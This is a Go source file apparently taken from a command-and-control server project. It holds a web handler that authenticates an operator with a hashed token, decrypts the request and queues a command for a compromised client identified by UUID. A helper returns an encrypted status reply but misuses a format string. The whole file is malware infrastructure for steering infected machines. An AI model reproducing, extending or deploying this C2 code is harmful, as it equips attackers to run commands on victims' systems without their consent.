package teamapi

import (
	"C2-Server/auth"
	"C2-Server/middle"
	"C2-Server/sql3"
	json2 "encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
)

//添加命令

func Addcmd(c *gin.Context)  {
	a, _ := c.GetRawData()
	//login_ip := c.ClientIP()
	token := c.GetHeader("token")
	decodestr := middle.Dcode(token, string(a))
	json := GetInfoUuid{} //注意该结构接受的内容
	json2.Unmarshal([]byte(decodestr), &json)
	//login_ip := c.ClientIP()
	jwttoken := c.GetHeader("Authorization")
	username := json.Username
	timestr := json.Time
	atoken := auth.GetMd5(username + jwttoken + timestr)
	if auth.AuthToken(token, atoken) == false { //验证两边token是否一致
		e := RetErr(token)
		c.String(http.StatusBadGateway, e)
		return
	} else {
		fmt.Println(json.Uuid)
		sql3.AddCmdstr(json.Uuid,json.Cmdtype,json.Msg)
		jsonstr := GetDatademo("")                      //原始数据
		abc := middle.Bcode(token, string(jsonstr)) //加密后
		//dd:=middle.AESDecrypt(d,[]byte("hello"))
		c.String(http.StatusOK, abc)
	}
}
func GetDatademo(s string) []byte { //编码json加密传输
	jsonByte, _ := json2.Marshal(s)
	jsonStr := string(jsonByte)
	a := `{"status":  200,
			"message": "ok"
			}`
	content := []byte(fmt.Sprintf(a, jsonStr))
	//fmt.Println(jsonStr)
	return content
}
